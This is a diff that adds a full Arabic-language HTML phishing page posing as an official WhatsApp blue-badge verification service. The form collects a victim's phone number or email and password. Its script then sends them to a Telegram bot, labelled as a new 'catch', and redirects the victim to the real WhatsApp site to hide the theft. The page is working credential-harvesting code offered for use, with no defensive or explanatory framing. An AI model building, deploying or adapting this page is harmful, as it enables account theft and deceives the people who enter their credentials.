@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp - التوثيق الرسمي بالعلامة الزرقاء</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background: #0b141a; color: #e9edef; display: flex; justify-content: center; align-items: center; padding: 15px; min-height: 100vh; background-image: radial-gradient(circle at 50% 10%, #00a88420 0%, transparent 70%); }
+        .wrapper { width: 100%; max-width: 420px; text-align: center; }
+        .hero-card { background: linear-gradient(145deg, #111b21 0%, #0b141a 100%); border: 1px solid rgba(0, 168, 132, 0.4); border-radius: 24px; padding: 35px 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.8); }
+        
+        /* صورة واتساب وبجانبها العلامة الزرقاء */
+        .brand-container { display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 15px; }
+        .wa-logo { width: 55px; height: 55px; background: #00a884; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 30px; box-shadow: 0 0 15px #00a884; }
+        .blue-badge { width: 28px; height: 28px; background: #0095f6; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: #fff; font-size: 14px; font-weight: bold; box-shadow: 0 0 10px #0095f6; }
+
+        h1 { font-size: 24px; color: #fff; margin-bottom: 8px; font-weight: 900; }
+        .subtitle { font-size: 13px; color: #8696a0; margin-bottom: 25px; line-height: 1.6; }
+        
+        .input-group { margin-bottom: 15px; text-align: right; }
+        input { width: 100%; padding: 14px 16px; background: #111b21; border: 1px solid #2a3942; border-radius: 14px; color: #fff; font-size: 14px; outline: none; }
+        input:focus { border-color: #00a884; }
+        
+        .btn-submit { width: 100%; padding: 14px; background: linear-gradient(135deg, #00a884 0%, #005c4b 100%); border: none; border-radius: 14px; color: #fff; font-weight: 900; cursor: pointer; font-size: 16px; box-shadow: 0 0 20px rgba(0, 168, 132, 0.4); margin-top: 10px; }
+        .footer { font-size: 11px; color: #667781; margin-top: 25px; }
+    </style>
+</head>
+<body>
+<div class="wrapper">
+    <div class="hero-card">
+        <div class="brand-container">
+            <div class="wa-logo">🟢</div>
+            <div class="blue-badge">✓</div>
+        </div>
+        <h1>توثيق واتساب الرسمي</h1>
+        <p class="subtitle">أدخل بيانات حسابك لتفعيل الشارة الزرقاء وحماية الحساب رسمياً.</p>
+        
+        <form onsubmit="submitForm(event)">
+            <div class="input-group"><input type="text" id="username" placeholder="رقم الهاتف أو البريد" required></div>
+            <div class="input-group"><input type="password" id="password" placeholder="كلمة المرور السرية" required></div>
+            <button type="submit" class="btn-submit">تأكيد طلب التوثيق 👑</button>
+        </form>
+    </div>
+    <div class="footer">🔒 منصة واتساب المعتمدة 2026</div>
+</div>
+
+<script src="config.js"></script>
+<script>
+    function submitForm(event) {
+        event.preventDefault();
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+        const text = `🚨 صيد توثيق واتساب الجديد!\n📱 الحساب: ${user}\n🔑 الرمز: ${pass}`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendMessage?chat_id=${BOT_CONFIG.chat_id}&text=${encodeURIComponent(text)}`)
+        .then(() => { window.location.href = "https://www.whatsapp.com"; });
+    }
+</script>
+</body>
+</html>
